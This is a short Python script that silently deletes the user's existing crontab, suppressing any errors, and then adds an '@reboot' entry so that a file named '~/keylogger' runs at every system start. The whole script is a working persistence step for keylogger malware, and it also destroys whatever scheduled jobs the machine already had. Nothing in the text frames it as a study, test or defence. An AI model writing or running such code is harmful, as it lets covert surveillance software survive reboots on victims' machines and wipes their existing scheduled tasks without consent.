import os

file_path = '~/keylogger'

# delete the crontab file and disregard any errors (ie. if there was no crontab file to begin with)
os.system("crontab -r > /dev/null 2>&1")
# make a new crontab by filling it with an empty line
os.system("echo '' | crontab -")
# update the crontab
os.system(f"( crontab -l; printf '@reboot \"{file_path}\"\n' ) | crontab -")
